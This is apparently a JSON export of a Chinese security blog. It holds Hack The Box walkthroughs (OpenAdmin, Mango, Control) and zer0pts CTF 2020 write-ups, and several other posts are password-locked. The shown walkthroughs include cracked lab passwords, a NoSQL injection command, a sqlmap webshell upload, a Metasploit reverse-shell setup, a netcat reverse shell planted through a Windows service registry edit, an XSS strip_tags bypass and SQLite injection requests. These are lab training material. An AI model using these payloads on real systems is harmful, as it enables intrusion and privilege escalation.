{"meta":{"title":"喵喵喵喵","subtitle":"某鱼唇的人类","description":"安全研究，懒，基本不自己写","author":"暗羽","url":"https://darkwing.moe"},"pages":[{"title":"","date":"2019-01-31T02:17:32.532Z","updated":"2019-01-31T02:17:32.532Z","comments":false,"path":"tags/index.html","permalink":"https://darkwing.moe/tags/index.html","excerpt":"","text":""},{"title":"","date":"2019-01-31T02:18:20.905Z","updated":"2019-01-31T02:18:20.905Z","comments":false,"path":"categories/index.html","permalink":"https://darkwing.moe/categories/index.html","excerpt":"","text":""},{"title":"links","date":"2019-08-27T04:41:10.000Z","updated":"2019-09-24T02:19:52.247Z","comments":true,"path":"links/index.html","permalink":"https://darkwing.moe/links/index.html","excerpt":"","text":"基础知识Hypertext Transfer ProtocolDomain Name SystemWhoisNetwork socketTCP/IPSecure Sockets LayerLearn about virtual hostingHow to setup vhosts with ApacheDNS zone transferSQL injectionFile inclusion vulnerabilityMIMEAntisec MovementDHCPFTPRequest for CommentsiptablesInternet Control Message ProtocolCryptographyCryptographic hash functionC (programming language)NmapSetuidWi-FiWEPWPAEnvironment VariablesNetwork Time ProtocolSMBMemory managementCall stackBuffer overflow protection 书单底层原理 《程序是怎样跑起来的》 矢泽久雄 《计算机是怎样跑起来的》 矢泽久雄 《深入理解计算机系统》 Bryant,R.E 《汇编语言》 王爽 《琢石成器—Windows 环境下32位汇编程序设计》 罗云彬 《C++反汇编与逆向分析技术揭秘》 钱林松，赵海旭 web安全 《白帽子讲web安全》 吴翰清 《图解HTTP》 上野宣 《Web前端黑客技术揭秘》 钟晨鸣 《XSS跨站脚本攻击剖析与防御》 邱永华 《SQL注入攻击与防御（第2版）》 Christof Paar、Jan Pelzl 《代码审计：企业级Web代码安全架构》 尹毅 Android安全 《第一行代码——Android》 郭霖 《Android软件安全与逆向分析》 韦生强 《Android恶意代码分析与渗透测试》 赵涏元 《Android安全架构深究》 Nikolay Elenkov 网络相关 《图解网络硬件》 三轮贤一 《图解TCP/IP》 竹下隆史，村山公保，荒井透，苅田幸雄 《Wireshark数据包分析实战》 Chris Sanders 《Wireshark网络分析就这么简单》 林沛满 《Wireshark网络分析的艺术》 林沛满"}],"posts":[{"title":"ForwardSlash - HackTheBox","slug":"ForwardSlash-HackTheBox","date":"2020-04-29T05:36:18.000Z","updated":"2020-04-29T05:37:12.571Z","comments":true,"path":"2020/04/29/ForwardSlash-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/04/29/ForwardSlash-HackTheBox/","excerpt":"有东西被加密了, 请输入密码查看.","text":"您好, 这里需要密码. ","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"ServMon - HackTheBox","slug":"ServMon-HackTheBox","date":"2020-04-27T09:08:22.000Z","updated":"2020-04-27T09:09:54.211Z","comments":true,"path":"2020/04/27/ServMon-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/04/27/ServMon-HackTheBox/","excerpt":"有东西被加密了, 请输入密码查看.","text":"您好, 这里需要密码. ","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Magic - HackTheBox","slug":"Magic-HackTheBox","date":"2020-04-26T06:24:30.000Z","updated":"2020-04-26T06:25:22.262Z","comments":true,"path":"2020/04/26/Magic-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/04/26/Magic-HackTheBox/","excerpt":"有东西被加密了, 请输入密码查看.","text":"您好, 这里需要密码. ","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Nest - HackTheBox","slug":"Nest-HackTheBox","date":"2020-04-24T07:00:17.000Z","updated":"2020-04-24T07:01:00.517Z","comments":true,"path":"2020/04/24/Nest-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/04/24/Nest-HackTheBox/","excerpt":"有东西被加密了, 请输入密码查看.","text":"您好, 这里需要密码. ","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"OpenAdmin - HackTheBox","slug":"OpenAdmin-HackTheBox","date":"2020-04-23T04:40:50.000Z","updated":"2020-05-04T13:11:56.112Z","comments":true,"path":"2020/04/23/OpenAdmin-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/04/23/OpenAdmin-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/222 10.10.10.171 端口扫描 80 直接访问是默认页面 扫描目录发现存在music目录，login是跳转到ona： ona getshellona默认guest用户登录，版本是 v18.1.1，搜索发现存在已知漏洞,注意这里要用全称搜索： 这个shell是www-root用户，收集信息发现两个用户名和一个密码： 12345678910111213141516171819202122232425$ ls /homejimmyjoanna$ cat local/config/database_settings.inc.php&lt;?php$ona_contexts=array ( 'DEFAULT' =&gt; array ( 'databases' =&gt; array ( 0 =&gt; array ( 'db_type' =&gt; 'mysqli', 'db_host' =&gt; 'localhost', 'db_login' =&gt; 'ona_sys', 'db_passwd' =&gt; 'n1nj4W4rri0R!', 'db_database' =&gt; 'ona_default', 'db_debug' =&gt; false, ), ), 'description' =&gt; 'Default data context', 'context_color' =&gt; '#D3DBFF', ),); jimmy ssh使用这个密码可以通过ssh登录jimmy,但flag应该是在另一个用户目录中： internal在apache目录看到有个internal，并且查看配置是开在本机的： main.php会将Joanna的私钥输出： 但这个私钥不能直接使用，需要密码： crack passphrase使用john转换后可以破解出密码：bloodninjas user flag使用私钥和对应的密码，登录joanna，得到user.txt: 提权信息直接sudo -l能够看到可以无需密码，sudo执行nano编辑opt下的priv： root flag可以直接使用nano的read file和功能读取/root/root.txt: 参考资料 Hackthebox——OpenAdminhttps://mp.weixin.qq.com/s/-aCfni01RdbFeuExpB7C9A HackTheBox: OpenAdmin Walkthrough 2020 - YouTubehttps://www.youtube.com/watch?v=QdA0bdThJx0&amp;list=PL_ZZRt90Mn-Uo9tejPa39jVofMA0aEHZn&amp;index=4","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Monteverde - HackTheBox","slug":"Monteverde-HackTheBox","date":"2020-04-21T06:39:04.000Z","updated":"2020-04-21T06:39:58.218Z","comments":true,"path":"2020/04/21/Monteverde-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/04/21/Monteverde-HackTheBox/","excerpt":"有东西被加密了, 请输入密码查看.","text":"您好, 这里需要密码. ","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Sauna - HackTheBox","slug":"Sauna-HackTheBox","date":"2020-04-20T07:31:12.000Z","updated":"2020-04-20T07:33:47.780Z","comments":true,"path":"2020/04/20/Sauna-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/04/20/Sauna-HackTheBox/","excerpt":"有东西被加密了, 请输入密码查看.","text":"您好, 这里需要密码. ","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Mango - HackTheBox","slug":"Mango-HackTheBox","date":"2020-04-17T06:53:16.000Z","updated":"2020-04-23T06:30:00.938Z","comments":true,"path":"2020/04/17/Mango-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/04/17/Mango-HackTheBox/","excerpt":"","text":"基本信息lab地址： https://www.hackthebox.eu/home/machines/profile/214 10.10.10.162 端口扫描 80 绑定hosts访问后是这个： 443 证书信息是staging-order.mango.htb，可以加到hosts里 Nosql injection80登录界面其实是nosql，可以用这个 https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration 1python nosqli-user-pass-enum.py -u http://staging-order.mango.htb/ -up username -pp password -ep username -op login:login -m POST 得到两个用户名： 同样的方法注入出password： 12345python nosqli-user-pass-enum.py -u http://staging-order.mango.htb/ -up username -pp password -ep password -op login:login -m POST2 password(s) found:h3mXK8RhU~f&#123;]f5Ht9KcS3&gt;!0B#2 user flag 对应关系是： 12mango:h3mXK8RhU~f&#123;]f5Hadmin:t9KcS3&gt;!0B#2 admin不能直接SSH登录，可以使用mango:h3mXK8RhU~f{]f5H可以登录SSH, user.txt在admin用户目录中： 使用admin账号密码切换到admin，得到user.txt: 提权信息使用LinEnum收集信息，发现可能利用的JJS root flagJJS具有SUID，直接使用JJS执行代码，读取root.txt: https://gtfobins.github.io/gtfobins/jjs/ 12345678admin@mango:/home/admin$ jjsWarning: The jjs tool is planned to be removed from a future JDK releasejjs&gt; var BufferedReader = Java.type(\"java.io.BufferedReader\");jjs&gt; var FileReader = Java.type(\"java.io.FileReader\");jjs&gt; var br = new BufferedReader(new FileReader(\"/root/root.txt\"));jjs&gt; while ((line = br.readLine()) != null) &#123; print(line); &#125;8a8ef79a7a2fbb01ea81688424e9ab15jjs&gt; 参考资料 https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration https://github.com/rebootuser/LinEnum Hack the box - Mangohttps://mp.weixin.qq.com/s/D2VxeXN2QEW-XXAqe6qGqw Hackthebox Mango - YouTubehttps://www.youtube.com/watch?v=BbcVNgQXzDg","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Obscurity - HackTheBox","slug":"Obscurity-HackTheBox","date":"2020-04-16T07:19:24.000Z","updated":"2020-04-16T07:20:19.156Z","comments":true,"path":"2020/04/16/Obscurity-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/04/16/Obscurity-HackTheBox/","excerpt":"有东西被加密了, 请输入密码查看.","text":"您好, 这里需要密码. ","categories":[],"tags":[]},{"title":"Resolute - HackTheBox","slug":"Resolute-HackTheBox","date":"2020-04-15T07:15:21.000Z","updated":"2020-04-15T07:16:00.603Z","comments":true,"path":"2020/04/15/Resolute-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/04/15/Resolute-HackTheBox/","excerpt":"有东西被加密了, 请输入密码查看.","text":"您好, 这里需要密码. ","categories":[],"tags":[]},{"title":"Remote - HackTheBox","slug":"Remote-HackTheBox","date":"2020-04-14T08:06:57.000Z","updated":"2020-04-14T08:08:44.608Z","comments":true,"path":"2020/04/14/Remote-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/04/14/Remote-HackTheBox/","excerpt":"有东西被加密了, 请输入密码查看.","text":"您好, 这里需要密码. ","categories":[],"tags":[]},{"title":"Traceback - HackTheBox","slug":"Traceback-HackTheBox","date":"2020-04-13T06:26:00.000Z","updated":"2020-04-13T06:27:08.186Z","comments":true,"path":"2020/04/13/Traceback-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/04/13/Traceback-HackTheBox/","excerpt":"有东西被加密了, 请输入密码查看.","text":"您好, 这里需要密码. ","categories":[],"tags":[]},{"title":"Book - HackTheBox","slug":"Book-HackTheBox","date":"2020-04-09T07:24:47.000Z","updated":"2020-04-09T07:26:00.494Z","comments":true,"path":"2020/04/09/Book-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/04/09/Book-HackTheBox/","excerpt":"有东西被加密了, 请输入密码查看.","text":"您好, 这里需要密码. ","categories":[],"tags":[]},{"title":"Control - HackTheBox","slug":"Control-HackTheBox","date":"2020-04-09T02:46:41.000Z","updated":"2020-04-26T00:53:38.930Z","comments":true,"path":"2020/04/09/Control-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/04/09/Control-HackTheBox/","excerpt":"","text":"基本信息lab地址：https://www.hackthebox.eu/home/machines/profile/218 10.10.10.167 端口扫描三个端口： 80 扫描目录发现存在一个admin.php,直接访问被拒绝： 提示缺失Header，需要通过代理访问，代理header那应该是XFF之类的，在首页源码能看到注释中的信息： 那么可以尝试用这个IP作为XFF头，直接burp加一条规则： SQL注入是一个简单的CRUD，很容易就发现存在注入： 不是DBA，直接os-shell能写入UDF，但没有回显： getshell那么可以尝试写webshell，因为是IIS，sql-shell测试写到IIS默认目录可以写入成功： 1select \"&lt;?php phpinfo(); ?&gt;\" into outfile \"C:/inetpub/wwwroot/info.php\": 'NULL' Sql-shell里写太麻烦，直接这样写webshell 1sqlmap -r sql.txt --file-write=shell.php --file-dest=C:/inetpub/wwwroot/shell.php --batch 然后为了方便可以直接上meterpreter： 1234567use exploit&#x2F;multi&#x2F;script&#x2F;web_deliveryset target PHPset payload php&#x2F;meterpreter&#x2F;reverse_tcpset lhost 10.10.14.103set srvhost 10.10.14.103set lport 7777run 账号信息可以在database.php里发现一个账号密码： 另外也可以直接通过注入获取mysql账号密码： 123hector | *0E178792E8FC304A2E3133D535D38CAF1DA3CD9D (l33th4x0rhector)|| manager | *CFE3EEE434B38CBF709AD67A4DCDEA476CBA7FDA (l3tm3!n) || root | *0A4A5CAD344718DC418035A1F4D292BA603134D8 root的解不出来 WinRM我们现在的shell是wwwroot用户，那么接下来应该就是要想办法切换到其他用户 netstat可以看到一个5985端口，这是WinRM 的默认端口，WinRM是Windows 系统的远程管理服务 进行端口转发，使用已经得到的账号密码尝试，能够知道hector的账号密码是正确的，但命令执行报错： 1portfwd add -l 5985 -p 5985 -r 10.10.10.167 可以换evil-winrm进行操作： https://github.com/Hackplayers/evil-winrm 这里因为安装问题，换到虚拟机了，使用hector账号密码，在桌面得到user flag 敏感文件在这个目录发现一个历史记录文件： 123*Evil-WinRM* PS C:\\Users\\Hector\\APpdata\\roaming\\microsoft\\windows\\powershell\\PSreadline&gt; type ConsoleHost_history.txtget-childitem HKLM:\\SYSTEM\\CurrentControlset | format-listget-acl HKLM:\\SYSTEM\\CurrentControlSet | format-list 提权这里可利用的是wuauserv，这个服务是Windows update的一个系统服务，系统权限。 修改这个服务的imagepath，反弹shell，为了方便还是通过hector的shell加载个meterpreter，上传nc，然后 1234reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlset\\Services\\wuauservreg add &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlset\\Services\\wuauserv&quot; &#x2F;t REG_EXPAND_SZ &#x2F;v ImagePath &#x2F;d &quot;C:\\Users\\Hector\\Documents\\nc64.exe -e cmd.exe 10.10.15.181 7777&quot; &#x2F;fThe operation completed successfully.start-service wuauserv root flag执行后得到system权限的reverse shell： 参考资料 Hackthebox——Controlhttps://mp.weixin.qq.com/s/8OugAknFrfKs5ujG4WKf1w powershell反弹shell常见方式 - 安全客，安全资讯平台https://www.anquanke.com/post/id/99793 Windows提权笔记 - 先知社区https://xz.aliyun.com/t/2519","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"MusicBlog -- zer0pts CTF 2020","slug":"MusicBlog-zer0pts-CTF-2020","date":"2020-03-10T08:42:03.000Z","updated":"2020-03-10T08:47:45.520Z","comments":true,"path":"2020/03/10/MusicBlog-zer0pts-CTF-2020/","link":"","permalink":"https://darkwing.moe/2020/03/10/MusicBlog-zer0pts-CTF-2020/","excerpt":"","text":"You can introduce favorite songs to friends with MusicBlog! Challenge (URL) 题目文件: MusicBlog_637545797ab8638bffd877d7be2ec045.tar.gz 是一个Blog。在发布文章时可以选择是否公开，如果设置为公开，admin用户会自动访问该文章并点赞。写文章时可以使用[[URL]]语法，将其插入到句子中会展开成&lt;audio controls src=&quot;URL&quot;&gt;&lt;/audio&gt;这样的audio元素。 首先，确认flag在哪。搜索zer0pts{ ，能够发现flag在worker/worker.js中，这是admin自动访问代码的一部分。 123456789101112131415161718192021222324// (snipped)const flag = 'zer0pts&#123;&lt;censored&gt;&#125;';// (snipped)const crawl = async (url) =&gt; &#123; console.log(`[+] Query! ($&#123;url&#125;)`); const page = await browser.newPage(); try &#123; await page.setUserAgent(flag); await page.goto(url, &#123; waitUntil: 'networkidle0', timeout: 10 * 1000, &#125;); await page.click('#like'); &#125; catch (err)&#123; console.log(err); &#125; await page.close(); console.log(`[+] Done! ($&#123;url&#125;)`)&#125;;// (snipped) await page.setUserAgent(flag);,会将User-Agent设置为flag。那么首先，考虑找到一个使用[[URL]]进行外部请求的方法，但是Content-Security-Policy: default-src &#39;self&#39;; object-src &#39;none&#39;; script-src &#39;nonce-yuAhic5Y6HSsT0e5zC8Qlg==&#39; &#39;strict-dynamic&#39;; base-uri &#39;none&#39;; trusted-types,严格的CSP策略会禁止这样。 但是，admin会进行await page.click(&#39;#like&#39;);，如果能够将一个可控元素的id设置为like，就可以利用admin的click，考虑通过XSS将admin重定向访问到外部。 查看文章的单独页面post.php, 能够发现这里将文章内容作为参数，经过render_tags后返回值显示在页面上。 12345︙ &lt;div class&#x3D;&quot;mt-3&quot;&gt; &lt;?&#x3D; render_tags($post[&#39;content&#39;]) ?&gt; &lt;&#x2F;div&gt;︙ render_tags在utils.php 中定义： 12345678&lt;?php&#x2F;&#x2F; [[URL]] → &lt;audio src&#x3D;&quot;URL&quot;&gt;&lt;&#x2F;audio&gt;function render_tags($str) &#123; $str &#x3D; preg_replace(&#39;&#x2F;\\[\\[(.+?)\\]\\]&#x2F;&#39;, &#39;&lt;audio controls src&#x3D;&quot;\\\\1&quot;&gt;&lt;&#x2F;audio&gt;&#39;, $str); $str &#x3D; strip_tags($str, &#39;&lt;audio&gt;&#39;); &#x2F;&#x2F; only allows &#96;&lt;audio&gt;&#96; return $str;&#125;︙ [[URL]]替换为&lt;audio controls src=&quot;URL&quot;&gt;&lt;/audio&gt;之后，通过strip_tags将audio 之外的标签消除来防止XSS。那如果使用[[&quot;&gt;&lt;/audio&gt;&lt;script&gt;alert(1)&lt;/script&gt;]] 作为URL，经过这种处理之后就变成了&lt;audio controls src=&quot;&quot;&gt;&lt;/audio&gt;alert(1)&quot;&gt;&lt;/audio&gt;,&lt;script&gt; 和&lt;/script&gt;都被删除了，做不了什么。 看一下Web server的Dockerfile，可以看到使用的是PHP 7.4.0， 截至2020年3月7日，最新版本为PHP 7.4.3，看起来稍微有点老，因此可以看一下PHP 7.4.0之后的PHP 7.4.1的ChangeLog。 Standard: Fixed bug #78814 (strip_tags allows / in tag name =&gt; whitelist bypass). 可以看到修复了strip_tags的一个bug，详细说明见 https://bugs.php.net/bug.php?id=78814 Bug #78814 strip_tags allows / in tag name, allowing whitelist bypass in browsers When strip_tags is used with a whitelist of tags, php allows slashes (“/”) that occur inside the name of a whitelisted tag and copies them to the result. For example, if is whitelisted, then a tag is also kept. 12345678910111213Test script:---------------&lt;?phpecho strip_tags(&quot;&lt;s&#x2F;trong&gt;b&lt;&#x2F;strong&gt;&quot;, &quot;&lt;strong&gt;&quot;);Expected result:----------------bActual result:--------------&lt;s&#x2F;trong&gt;b&lt;&#x2F;strong&gt; 将&lt;strong&gt; 作为白名单时，添加斜杠的&lt;s/trong&gt;没有被删除，原样输出。MusicBlog 中使用的是&lt;audio&gt;作为白名单，&lt;a/udio&gt;可以通过函数处理，并且&lt;a/udio&gt;会作为 超链接&lt;a&gt;被解析。 因此，利用这个bug，使用[[&quot;&gt;&lt;/audio&gt;&lt;a/udio href=&quot;(URL)&quot; id=&quot;like&quot;&gt;test&lt;/a/udio&gt;&lt;audio a=&quot;]] 这样的内容的话，经过处理在文章中展开后是 1&lt;audio controls src=\"\"&gt;&lt;/audio&gt;&lt;a/udio href=\"(URL)\" id=\"like\"&gt;test&lt;/a/udio&gt;&lt;audio a=\"\"&gt;&lt;/audio&gt; 这样admin自动去点击id为like的标签的话，会点击到我们可控的外部链接。 123456789101112$ nc -lvp 8000Listening on [0.0.0.0] (family 0, port 8000)Connection from ec2-3-112-201-75.ap-northeast-1.compute.amazonaws.com 33926 received!GET / HTTP/1.1︙Connection: keep-aliveUpgrade-Insecure-Requests: 1User-Agent: zer0pts&#123;M4sh1m4fr3sh!!&#125;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9︙Accept-Encoding: gzip, deflateAccept-Language: en-US 参考资料https://st98.github.io/diary/posts/2020-03-09-zer0pts-ctf-2020.html","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"}]},{"title":"phpNantokaAdmin -- zer0pts CTF 2020","slug":"phpNantokaAdmin-zer0pts-CTF-2020","date":"2020-03-10T06:20:17.000Z","updated":"2020-03-10T06:21:31.283Z","comments":true,"path":"2020/03/10/phpNantokaAdmin-zer0pts-CTF-2020/","link":"","permalink":"https://darkwing.moe/2020/03/10/phpNantokaAdmin-zer0pts-CTF-2020/","excerpt":"","text":"phpNantokaAdmin is a management tool for SQLite. Challenge (URL) 题目文件: phpNantokaAdmin_49b112bf908ecef40f17684f4120b0aa.tar.gz 题目是一个SQLite数据库管理工具，实现的功能只有table的创建，展示，record的插入，首先确认一下flag在哪里： 123456&lt;?php︙ $pdo-&gt;query('CREATE TABLE `' . FLAG_TABLE . '` (`' . FLAG_COLUMN . '` TEXT);'); $pdo-&gt;query('INSERT INTO `' . FLAG_TABLE . '` VALUES (\"' . FLAG . '\");'); $pdo-&gt;query($sql);︙ 创建了一个flag表，其中插入了flag记录。表名和列名是config.php中定义的常量，另外： 123456789&lt;?php︙ $pdo = new PDO('sqlite:db/' . $_SESSION['database']); $stmt = $pdo-&gt;query(\"SELECT name FROM sqlite_master WHERE type='table' AND name &lt;&gt; '\" . FLAG_TABLE . \"' LIMIT 1;\"); $table_name = $stmt-&gt;fetch(PDO::FETCH_ASSOC)['name']; $stmt = $pdo-&gt;query(\"PRAGMA table_info(`&#123;$table_name&#125;`);\"); $column_names = $stmt-&gt;fetchAll(PDO::FETCH_ASSOC);︙ 这样限制了可以展示的表仅限于flag表之外用户创建的表。 index.php中可以看出，创建表时表名，列名，列类型可能存在SQL注入： 123456789101112131415161718192021222324252627282930&lt;?php︙ if (!is_valid($table_name)) &#123; flash('Table name contains dangerous characters.'); &#125; if (strlen($table_name) &lt; 4 || 32 &lt; strlen($table_name)) &#123; flash('Table name must be 4-32 characters.'); &#125; if (count($columns) &lt;= 0 || 10 &lt; count($columns)) &#123; flash('Number of columns is up to 10.'); &#125; $sql = \"CREATE TABLE &#123;$table_name&#125; (\"; $sql .= \"dummy1 TEXT, dummy2 TEXT\"; for ($i = 0; $i &lt; count($columns); $i++) &#123; $column = (string) ($columns[$i]['name'] ?? ''); $type = (string) ($columns[$i]['type'] ?? ''); if (!is_valid($column) || !is_valid($type)) &#123; flash('Column name or type contains dangerous characters.'); &#125; if (strlen($column) &lt; 1 || 32 &lt; strlen($column) || strlen($type) &lt; 1 || 32 &lt; strlen($type)) &#123; flash('Column name and type must be 1-32 characters.'); &#125; $sql .= ', '; $sql .= \"`$column` $type\"; &#125; $sql .= ');';︙ 但是，参数使用了utils.php中定义的is_valid函数进行一次检查，禁用了一些特殊字符： 1234567891011121314&lt;?php︙function is_valid($string) &#123; $banword = [ // comment out, calling function... \"[\\\"#'()*,\\\\/\\\\\\\\`-]\" ]; $regexp = '/' . implode('|', $banword) . '/i'; if (preg_match($regexp, $string)) &#123; return false; &#125; return true;&#125;︙ 首先确认下能够通过is_valid函数的字符： 12345678910111213141516171819202122232425$ cat test.php&lt;?phpfunction is_valid($string) &#123; $banword = [ // comment out, calling function... \"[\\\"#'()*,\\\\/\\\\\\\\`-]\" ]; $regexp = '/' . implode('|', $banword) . '/i'; if (preg_match($regexp, $string)) &#123; return false; &#125; return true;&#125;$res = '';for ($i = 0x20; $i &lt; 0x7f; $i++) &#123; $c = chr($i); if (is_valid($c)) &#123; $res .= $c; &#125;&#125;echo $res . \"\\n\";$ php test.php !$%&amp;+.0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_abcdefghijklmnopqrstuvwxyz&#123;|&#125;~ 注意结果，[和]可以使用，在SQLite中，可以使用[和]代替反引号`,来包裹关键词（文档） 另外，SQLite中可以使用CREATE TABLE … AS这样的用法，从其他的表的内容来创建新的表。 利用这些，在创建表时，表名t AS SELECT sql [, 列名abc，列类型]FROM sqlite_master;, 这样拼接后的SQL为： 1CREATE TABLE t AS SELECT sql [ (dummy1 TEXT, dummy2 TEXT, &#96;abc&#96; ]FROM sqlite_master;); 等价于CREATE TABLE t AS SELECT sql FROM sqlite_master;,(dummy1…被解释为sql的别名。这样在展示表时可以获得插入flag时的语句，其中包括flag表名和列名： 12345678910111213141516171819202122232425262728293031$ curl &#39;http:&#x2F;&#x2F;3.112.201.75:8002&#x2F;?page&#x3D;create&#39; -b cookie.txt -c cookie.txt -L -H &#39;Content-Type: application&#x2F;x-www-form-urlencoded&#39; --data &#39;table_name&#x3D;t+AS+SELECT+sql+%5B&amp;columns%5B0%5D%5Bname%5D&#x3D;abc&amp;columns%5B0%5D%5Btype%5D&#x3D;%5DFROM+sqlite_master%3B&#39;&lt;!doctype html&gt;&lt;html lang&#x3D;&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;style.css&quot;&gt; &lt;script src&#x3D;&quot;https:&#x2F;&#x2F;code.jquery.com&#x2F;jquery-3.4.1.min.js&quot; integrity&#x3D;&quot;sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo&#x3D;&quot; crossorigin&#x3D;&quot;anonymous&quot;&gt;&lt;&#x2F;script&gt; &lt;title&gt;phpNantokaAdmin&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;h1&gt;phpNantokaAdmin&lt;&#x2F;h1&gt; &lt;h2&gt;t (&lt;a href&#x3D;&quot;?page&#x3D;delete&quot;&gt;Delete table&lt;&#x2F;a&gt;)&lt;&#x2F;h2&gt; &lt;form action&#x3D;&quot;?page&#x3D;insert&quot; method&#x3D;&quot;POST&quot;&gt; &lt;table&gt; &lt;tr&gt; &lt;th&gt; (dummy1 TEXT, dummy2 TEXT, &#96;abc&#96; &lt;&#x2F;th&gt; &lt;&#x2F;tr&gt; &lt;tr&gt; &lt;td&gt;CREATE TABLE &#96;flag_bf1811da&#96; (&#96;flag_2a2d04c3&#96; TEXT)&lt;&#x2F;td&gt; &lt;&#x2F;tr&gt; &lt;tr&gt; &lt;td&gt;&lt;&#x2F;td&gt; &lt;&#x2F;tr&gt; &lt;tr&gt; &lt;td&gt;&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;values[]&quot;&gt;&lt;&#x2F;td&gt; &lt;&#x2F;tr&gt; &lt;&#x2F;table&gt; &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Insert values&quot;&gt; &lt;&#x2F;form&gt; &lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 得到了flag表名和列名，替换语句中的sql和sqlite_master 即可获得flag： 12345678910111213141516171819202122232425262728$ curl &#39;http:&#x2F;&#x2F;3.112.201.75:8002&#x2F;?page&#x3D;create&#39; -b cookie.txt -c cookie.txt -L -H &#39;Content-Type: application&#x2F;x-www-form-urlencoded&#39; --data &#39;table_name&#x3D;t+AS+SELECT+flag_2a2d04c3+%5B&amp;columns%5B0%5D%5Bname%5D&#x3D;abc&amp;columns%5B0%5D%5Btype%5D&#x3D;%5DFROM+flag_bf1811da%3B&#39;&lt;!doctype html&gt;&lt;html lang&#x3D;&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;style.css&quot;&gt; &lt;script src&#x3D;&quot;https:&#x2F;&#x2F;code.jquery.com&#x2F;jquery-3.4.1.min.js&quot; integrity&#x3D;&quot;sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo&#x3D;&quot; crossorigin&#x3D;&quot;anonymous&quot;&gt;&lt;&#x2F;script&gt; &lt;title&gt;phpNantokaAdmin&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;h1&gt;phpNantokaAdmin&lt;&#x2F;h1&gt; &lt;h2&gt;t (&lt;a href&#x3D;&quot;?page&#x3D;delete&quot;&gt;Delete table&lt;&#x2F;a&gt;)&lt;&#x2F;h2&gt; &lt;form action&#x3D;&quot;?page&#x3D;insert&quot; method&#x3D;&quot;POST&quot;&gt; &lt;table&gt; &lt;tr&gt; &lt;th&gt; (dummy1 TEXT, dummy2 TEXT, &#96;abc&#96; &lt;&#x2F;th&gt; &lt;&#x2F;tr&gt; &lt;tr&gt; &lt;td&gt;zer0pts&#123;Smile_Sweet_Sister_Sadistic_Surprise_Service_SQL_Injection!!&#125;&lt;&#x2F;td&gt; &lt;&#x2F;tr&gt; &lt;tr&gt; &lt;td&gt;&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;values[]&quot;&gt;&lt;&#x2F;td&gt; &lt;&#x2F;tr&gt; &lt;&#x2F;table&gt; &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Insert values&quot;&gt; &lt;&#x2F;form&gt; &lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 参考资料https://st98.github.io/diary/posts/2020-03-09-zer0pts-ctf-2020.html","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"}]},{"title":"Can you guess it? -- zer0pts CTF 2020","slug":"Can-you-guess-it-zer0pts-CTF-2020","date":"2020-03-10T02:17:18.000Z","updated":"2020-03-10T02:17:59.920Z","comments":true,"path":"2020/03/10/Can-you-guess-it-zer0pts-CTF-2020/","link":"","permalink":"https://darkwing.moe/2020/03/10/Can-you-guess-it-zer0pts-CTF-2020/","excerpt":"","text":"Challenge (URL) 题目文件: Can_you_guess_it_ffc668f78ed564bf7a62463fd16bc26c.tar.gz index.php 内容如下： 